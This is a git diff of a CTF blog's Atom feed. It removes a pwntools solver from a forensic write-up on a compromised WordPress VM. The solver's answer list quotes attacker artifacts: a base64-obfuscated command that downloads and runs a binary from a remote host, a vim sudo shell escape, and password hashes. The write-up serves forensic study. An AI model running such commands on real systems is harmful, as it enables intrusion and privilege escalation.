@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-18T10:49:02+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-18T17:06:41+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
 </subtitle><author><name>Jaysen</name></author><entry><title type="html">Breached - C2C 2026 Qualification</title><link href="http://localhost:4000/C2C2026Qual-Breached/" rel="alternate" type="text/html" title="Breached - C2C 2026 Qualification" /><published>2026-02-17T00:00:00+07:00</published><updated>2026-02-17T00:00:00+07:00</updated><id>http://localhost:4000/C2C2026Qual-Breached</id><content type="html" xml:base="http://localhost:4000/C2C2026Qual-Breached/"><![CDATA[<p>This challenge is a very interesting and fun forensic scenario. We are placed in the role of the blue team, tasked with investigating a compromised virtual machine and reconstructing the entire attack purely from artifacts.</p>
 
 <p>The scenario feels similar to a boot2root-style machine, but from the defensive perspective: rather than exploiting the system, we must analyze logs and disk artifactsto understand how the attacker gained access, escalated privileges, established persistence, and finally encrypted sensitive data.</p>
@@ -562,75 +562,8 @@ and decrypt any other ciphertext of &lt;= keystream length.
 <p><img src="/assets/breached/48.png" alt="alt text" />  <br />
 Answer : <code class="language-plaintext highlighter-rouge">D3cRyptEd1337!!</code></p>
 
-<h3 id="automated-solver">Automated Solver</h3>
-<p>Here’s my automated solver :</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">info</span><span class="sh">"</span>
-
-    <span class="n">HOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">challenges.1pc.tf</span><span class="sh">"</span>
-    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">34434</span>
-    
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="n">log</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Gagal konek ke server: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">192.168.56.106</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">192.168.56.104</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">21,22,8080</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">20/01/2026 07:55:26</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">dirsearch,nuclei,wpscan</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">CVE-2025-26943</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">$wp$2y$12$HExJaTmUXM9JxiegvEHU1.KJmHh.eayKgldvQ9nRx6agpiSCOy35.</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">3eb29d691548c45ea17c2302aa251c55</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">CVE-2023-3277</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">$wp$2y$10$nX7P5HYoKSQSxYd/8WJoReewlYZ025COyQs3.MvY/5hnsN0mZ88fG</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">princess</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/var/www/html/wp-content/plugins/hello.php</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">10b29258c7e57eff:0fd7943d377fd8aa</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">cat /etc/passwd</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/tmp/lin.sh</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">programmer</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">$y$j9T$mnowOuMeDR90jMf.c2p4z1$y.doQVO3iErFbxhrht0JR4LNiK.5JgBYJ9GLwKav0K8</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/bin/vim</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">sudo -u hr vim -c :!/bin/bash</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">hr</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/local/bin/hr</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">editEmployee</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/lib/x86_64-linux-gnu/security/pam_unix.so</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">ccc4db16da53f4d801a2ad91818b45ed617ba53d</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">/opt/drop</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">echo d2dldCBodHRwOi8vMTkyLjE2OC41Ni4xMDQ6MTMzNy9tOyBjaG1vZCAreCBtOyAuL20= | base64 -d | bash</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sa">b</span><span class="sh">'</span><span class="s">D3cRyptEd1337!!</span><span class="sh">'</span>
-    <span class="p">]</span>
-
-    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ans</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Answer:</span><span class="sh">"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-
-            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">=== Soal </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s"> ===</span><span class="sh">"</span><span class="p">)</span>
-            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">))</span>
-
-
-            <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Sending: </span><span class="si">{</span><span class="n">ans</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-            <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
-        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
-            <span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sh">"</span><span class="s">Server memutus koneksi (EOF)</span><span class="sh">"</span><span class="p">)</span>
-            <span class="k">break</span>
-
-    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
-    <span class="nf">main</span><span class="p">()</span>
-</code></pre></div></div>
-<p><img src="/assets/breached/49.png" alt="alt text" />
-FLAG : 
-C2C{someone_just_rooted_ur_server_hahaha_3d9a39663bf2}</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="DFIR" /><category term="Linux" /><category term="WordPress" /><category term="WebShell" /><category term="MalwareAnalysis" /><category term="ReverseEngineering" /><category term="PrivilegeEscalation" /><category term="Persistence" /><category term="Ransomware" /><summary type="html"><![CDATA[This challenge is a very interesting and fun forensic scenario. We are placed in the role of the blue team, tasked with investigating a compromised virtual machine and reconstructing the entire attack purely from artifacts.]]></summary></entry><entry><title type="html">Unorthodox Part 1 – Cyber Jawara Qual 2025</title><link href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/" rel="alternate" type="text/html" title="Unorthodox Part 1 – Cyber Jawara Qual 2025" /><published>2026-01-17T00:00:00+07:00</published><updated>2026-01-17T00:00:00+07:00</updated><id>http://localhost:4000/CyberJawara2025-Unorthodox%20Part%201</id><content type="html" xml:base="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/"><![CDATA[<p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
+<h3 id="flag">FLAG</h3>
+<p>C2C{someone_just_rooted_ur_server_hahaha_3d9a39663bf2}</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="DFIR" /><category term="Linux" /><category term="WordPress" /><category term="WebShell" /><category term="MalwareAnalysis" /><category term="ReverseEngineering" /><category term="PrivilegeEscalation" /><category term="Persistence" /><category term="Ransomware" /><summary type="html"><![CDATA[This challenge is a very interesting and fun forensic scenario. We are placed in the role of the blue team, tasked with investigating a compromised virtual machine and reconstructing the entire attack purely from artifacts.]]></summary></entry><entry><title type="html">Unorthodox Part 1 – Cyber Jawara Qual 2025</title><link href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/" rel="alternate" type="text/html" title="Unorthodox Part 1 – Cyber Jawara Qual 2025" /><published>2026-01-17T00:00:00+07:00</published><updated>2026-01-17T00:00:00+07:00</updated><id>http://localhost:4000/CyberJawara2025-Unorthodox%20Part%201</id><content type="html" xml:base="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/"><![CDATA[<p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
 
 <p>Unorthodox – Part 1 stood out as a particularly interesting challenge due to its realistic investigation flow, especially in the later stage where the attacker leveraged <strong>less common persistence techniques</strong>. Instead of relying on obvious indicators of compromise, the challenge required careful review of package installation logs and extended file attributes to uncover a stealthy payload hidden using <strong>xattr</strong>, which was planted months before the actual data exfiltration took place.</p>
 
